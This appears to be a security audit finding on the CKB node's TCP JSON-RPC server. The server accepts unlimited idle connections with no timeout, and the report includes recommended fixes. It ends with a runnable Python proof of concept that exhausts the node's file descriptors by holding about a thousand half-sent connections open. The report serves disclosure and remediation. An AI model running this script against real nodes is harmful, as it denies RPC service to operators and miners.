### Title
TCP RPC Server Accepts Unbounded Connections Without Timeout, Enabling Connection-Exhaustion DoS - (File: `rpc/src/server.rs`)

---

### Summary

The CKB TCP JSON-RPC server (`start_tcp_server`) accepts an unlimited number of TCP connections and spawns an unbounded number of Tokio tasks, one per connection, with no idle timeout and no connection count limit. A caller who can reach the TCP RPC port can open thousands of connections and hold them open indefinitely by never sending a newline-terminated JSON line, exhausting the process's file descriptors and Tokio task memory and preventing the node from accepting any further RPC connections.

---

### Finding Description

`RpcServer::start_tcp_server` in `rpc/src/server.rs` implements a line-delimited JSON-over-TCP RPC transport. The accept loop is unbounded:

```rust
while let Ok((stream, _)) = listener.accept().await {
    let rpc = Arc::clone(&rpc);
    let stream_config = stream_config.clone();
    let codec = codec.clone();
    tokio::spawn(async move {
        let (r, w) = stream.into_split();
        let r = FramedRead::new(r, codec.clone()).map_ok(StreamMsg::Str);
        // ...
        serve_stream_sink(&rpc, w, r, stream_config).await
    });
}
``` [1](#0-0) 

For every accepted connection a new `tokio::spawn` task is created. The task calls `serve_stream_sink`, which drives a `FramedRead<_, LinesCodec>` reader. `LinesCodec` buffers bytes until it sees a `\n` character. If the remote peer connects and sends no data (or sends a partial line that never terminates), the read future never resolves and the task lives forever.

The `StreamServerConfig` built for the TCP server sets only `channel_size` and `pipeline_size`; no idle or read timeout is configured:

```rust
let stream_config = StreamServerConfig::default()
    .with_channel_size(4)
    .with_pipeline_size(4)
    .with_shutdown(async move { new_tokio_exit_rx().cancelled().await; });
``` [2](#0-1) 

There is no `with_timeout`, no `semaphore`, and no `max_connections` guard anywhere in the TCP server path. A grep across all RPC source files confirms zero matches for `with_timeout`, `idle_timeout`, `connection_limit`, `semaphore`, or `max_connections`.

**Contrast with the HTTP/WS server.** The sibling `start_server` function wraps the Axum router with `tower_http::timeout::TimeoutLayer` set to 30 seconds:

```rust
.layer(TimeoutLayer::with_status_code(
    StatusCode::REQUEST_TIMEOUT,
    Duration::from_secs(30),
))
``` [3](#0-2) 

The TCP server has no equivalent protection.

---

### Impact Explanation

Each held-open TCP connection consumes:
- One OS file descriptor (socket).
- One Tokio task (stack + heap allocation, typically 8–64 KB).
- One `LinesCodec` read buffer (up to 2 MiB per connection, as set by `LinesCodec::new_with_max_length(2 * 1024 * 1024)`). [4](#0-3) 

On a default Linux system the per-process file-descriptor limit is 1024. An attacker who opens ~1000 idle TCP connections exhausts this limit. After that, `listener.accept()` returns `Err` for every new connection attempt, and the `while let Ok(...)` loop silently stops accepting. All legitimate RPC callers (miners polling `get_block_template`, operators calling `send_transaction`, monitoring scripts, etc.) are denied service for as long as the attacker holds the connections open.

---

### Likelihood Explanation

The TCP RPC server is an opt-in feature (`tcp_listen_address` is commented out in the default config), but it is a documented and supported transport explicitly listed in the RPC README and the default config template. Operators who enable it for tooling or scripting purposes are exposed. The attack requires only the ability to open TCP connections to the configured port — no authentication, no valid JSON, no protocol knowledge. A single attacker process on the same host (or any host that can reach the port) can execute it with a trivial loop of `connect()` calls.

---

### Recommendation

1. **Add a per-connection idle/read timeout.** Wrap the `FramedRead` stream with `tokio::time::timeout` or use `tokio_util::time::DelayQueue` so that connections that do not deliver a complete line within a configurable deadline (e.g., 30 seconds, matching the HTTP server) are dropped.

2. **Bound the number of concurrent TCP connections.** Use a `tokio::sync::Semaphore` (or `tower::limit::ConcurrencyLimitLayer`) to cap the number of simultaneously active TCP sessions, analogous to how the HTTP server relies on Axum/Hyper's built-in connection management.

Example for the timeout fix:

```rust
tokio::spawn(async move {
    let (r, w) = stream.into_split();
    let r = FramedRead::new(r, codec.clone()).map_ok(StreamMsg::Str);
    // ...
    let result = tokio::time::timeout(
        Duration::from_secs(30),
        serve_stream_sink(&rpc, w, r, stream_config),
    ).await;
    if result.is_err() {
        info!("TCP RPCServer: connection timed out");
    }
});
```

---

### Proof of Concept

```python
import socket, time

HOST = "127.0.0.1"
PORT = 18114          # tcp_listen_address default

sockets = []
for i in range(1020):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        # Send a partial (non-newline-terminated) JSON fragment so the
        # LinesCodec read future blocks indefinitely.
        s.send(b'{"id":1,"jsonrpc":"2.0","method":"get_tip_block_number","params":[]')
        sockets.append(s)
    except Exception as e:
        print(f"Failed at {i}: {e}")
        break

print(f"Held {len(sockets)} connections open")
# At this point the CKB node's file-descriptor table is saturated.
# New legitimate connections to the TCP RPC port will be refused.
time.sleep(3600)
```

After running this script, any subsequent `connect()` to the TCP RPC port returns `Connection refused` or `Too many open files`, and the node's TCP RPC service is unavailable until the attacker releases the connections.

### Citations

**File:** rpc/src/server.rs (L125-128)
```rust
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
```

**File:** rpc/src/server.rs (L165-165)
```rust
            let codec = LinesCodec::new_with_max_length(2 * 1024 * 1024);
```

**File:** rpc/src/server.rs (L166-171)
```rust
            let stream_config = StreamServerConfig::default()
                .with_channel_size(4)
                .with_pipeline_size(4)
                .with_shutdown(async move {
                    new_tokio_exit_rx().cancelled().await;
                });
```

**File:** rpc/src/server.rs (L174-194)
```rust
            tokio::select! {
                _ = async {
                        while let Ok((stream, _)) = listener.accept().await {
                            let rpc = Arc::clone(&rpc);
                            let stream_config = stream_config.clone();
                            let codec = codec.clone();
                            tokio::spawn(async move {
                                let (r, w) = stream.into_split();
                                let r = FramedRead::new(r, codec.clone()).map_ok(StreamMsg::Str);
                                let w = FramedWrite::new(w, codec).with(|msg| async move {
                                    Ok::<_, LinesCodecError>(match msg {
                                        StreamMsg::Str(msg) => msg,
                                        _ => "".into(),
                                    })
                                });
                                tokio::pin!(w);
                                if let Err(err) = serve_stream_sink(&rpc, w, r, stream_config).await {
                                    info!("TCP RPCServer error: {:?}", err);
                                }
                            });
                        }
```
